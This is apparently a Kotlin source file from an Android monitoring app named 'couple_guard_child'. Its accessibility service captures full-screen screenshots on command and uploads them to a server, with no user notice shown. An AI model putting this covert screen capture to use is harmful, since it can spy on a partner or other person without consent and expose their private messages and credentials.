package com.example.couple_guard_child.services

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.graphics.Bitmap
import android.hardware.HardwareBuffer
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Log
import androidx.annotation.RequiresApi
import com.example.couple_guard_child.utils.ApiClient
import com.example.couple_guard_child.ImageCompressor
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.Executors

class MyAccessibilityService : AccessibilityService() {

    companion object {
        private const val TAG = "MyAccessibilityService"
        const val ACTION_TAKE_SCREENSHOT = "com.example.couple_guard_child.TAKE_SCREENSHOT"
        var instance: MyAccessibilityService? = null
    }

    private val executor = Executors.newSingleThreadExecutor()
    private val handler = Handler(Looper.getMainLooper())

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.d(TAG, "✅ AccessibilityService created")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
        executor.shutdown()
        Log.d(TAG, "AccessibilityService destroyed")
    }

    override fun onAccessibilityEvent(event: android.view.accessibility.AccessibilityEvent?) {
        // Tidak dipakai, wajib override
    }

    override fun onInterrupt() {
        Log.w(TAG, "Accessibility service interrupted")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        intent?.action?.let { action ->
            if (action == ACTION_TAKE_SCREENSHOT) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    takeScreenshot()
                } else {
                    Log.e(TAG, "❌ Screenshot requires Android 11+")
                }
            }
        }
        return super.onStartCommand(intent, flags, startId)
    }

    @RequiresApi(Build.VERSION_CODES.R)
    fun takeScreenshot() {
        Log.d(TAG, "========================================")
        Log.d(TAG, "📸 Taking screenshot via Accessibility Service")
        
        try {
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                executor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(screenshotResult: ScreenshotResult) {
                        Log.d(TAG, "✅ Screenshot captured successfully")
                        handleScreenshotSuccess(screenshotResult)
                    }

                    override fun onFailure(errorCode: Int) {
                        Log.e(TAG, "❌ Screenshot failed with error code: $errorCode")
                        val errorMsg = when(errorCode) {
                            ERROR_TAKE_SCREENSHOT_INTERNAL_ERROR -> "Internal error"
                            ERROR_TAKE_SCREENSHOT_INTERVAL_TIME_SHORT -> "Too frequent requests"
                            ERROR_TAKE_SCREENSHOT_INVALID_DISPLAY -> "Invalid display"
                            ERROR_TAKE_SCREENSHOT_NO_ACCESSIBILITY_ACCESS -> "No accessibility access"
                            ERROR_TAKE_SCREENSHOT_SECURE_WINDOW -> "Secure window (cannot capture)"
                            else -> "Unknown error: $errorCode"
                        }
                        Log.e(TAG, "Error details: $errorMsg")
                    }
                }
            )
        } catch (e: SecurityException) {
            Log.e(TAG, "❌ Security exception - no permission", e)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Screenshot exception", e)
            e.printStackTrace()
        }
        
        Log.d(TAG, "========================================")
    }

    @RequiresApi(Build.VERSION_CODES.R)
    private fun handleScreenshotSuccess(result: ScreenshotResult) {
        try {
            val hardwareBuffer: HardwareBuffer = result.hardwareBuffer
            val colorSpace = result.colorSpace
            
            Log.d(TAG, "Processing screenshot...")
            Log.d(TAG, "Buffer size: ${hardwareBuffer.width}x${hardwareBuffer.height}")
            
            // Convert HardwareBuffer to Bitmap
            val bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, colorSpace)
                ?.copy(Bitmap.Config.ARGB_8888, false)

            hardwareBuffer.close()

            if (bitmap == null) {
                Log.e(TAG, "❌ Failed to convert to bitmap")
                return
            }

            Log.d(TAG, "✅ Bitmap created: ${bitmap.width}x${bitmap.height}")

            // Save to file
            val file = File(filesDir, "screenshot_${System.currentTimeMillis()}.jpg")
            
            try {
                FileOutputStream(file).use { out ->
                    val compressed = bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
                    if (!compressed) {
                        Log.e(TAG, "❌ Failed to compress bitmap")
                        return
                    }
                }
                
                Log.d(TAG, "✅ Screenshot saved: ${file.absolutePath}")
                Log.d(TAG, "File size: ${file.length() / 1024} KB")

                // Compress image for upload
                val compressedFile = ImageCompressor.compressImage(
                    file = file,
                    maxWidth = 1280,
                    maxHeight = 720,
                    quality = 75
                )

                // Upload in background thread
                Thread {
                    try {
                        val success = ApiClient.uploadScreenshot(
                            applicationContext,
                            compressedFile
                        )
                        
                        if (success) {
                            Log.d(TAG, "✅ Screenshot uploaded successfully")
                        } else {
                            Log.e(TAG, "❌ Failed to upload screenshot")
                        }
                        
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Exception uploading screenshot", e)
                    } finally {
                        // Clean up files
                        try {
                            compressedFile.delete()
                            Log.d(TAG, "✅ Temp files cleaned")
                        } catch (e: Exception) {
                            Log.e(TAG, "Failed to delete temp files", e)
                        }
                    }
                }.start()

            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed saving screenshot", e)
                e.printStackTrace()
            } finally {
                bitmap.recycle()
            }

        } catch (e: Exception) {
            Log.e(TAG, "❌ Error processing screenshot", e)
            e.printStackTrace()
        }
    }
}